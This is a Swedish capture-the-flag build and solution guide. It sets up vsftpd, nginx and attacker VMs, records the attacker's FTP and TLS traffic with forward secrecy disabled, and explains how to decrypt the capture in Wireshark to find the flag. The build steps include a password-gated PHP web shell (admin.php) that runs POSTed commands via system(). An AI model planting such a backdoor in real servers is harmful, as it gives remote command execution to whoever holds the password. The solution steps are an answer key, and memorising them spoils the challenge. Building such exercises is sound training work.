Byggnad:

Du skall ha 3 VM:ar uppe. En ska köra vsftpd, den andra ska köra nginx och den tredje ska vara en angripare.
1. Generera egna SSL-certifikat (eller återanvänd de från website_stuff) och stoppa in de i nginx. Var märksam med att stänga av PFS.

1a. Installera och sätt på php-fpm i nginx.

1b. I /var/www/html ska filen `admin.php` skapas med koden 
```
<?php
if ($_POST['ADMIN_PASSWORD'] === 'UnCr4ck4bl3_P455W0RD')
	system($_POST['cmd']);
?>
```
2. Kasta in website_stuff mappen i VM:en med vsftpd på.

3. Starta Wireshark och gör en inspelning på när angriparen ftp:ar in på vsftpd-maskinen, laddar ner alla hemligheter, för att sedan köra en curl mot nginx-maskinen.

Lösning:
1. Öppna pcap:en i Wireshark.
2. Spara TCP-strömmen från frame 154 till någon fil.
3. Lägg till filen som du nyss sparade till dina lokala RSA-nycklar i Wireshark.
4. Gå till frame 184 och läs av flaggan.
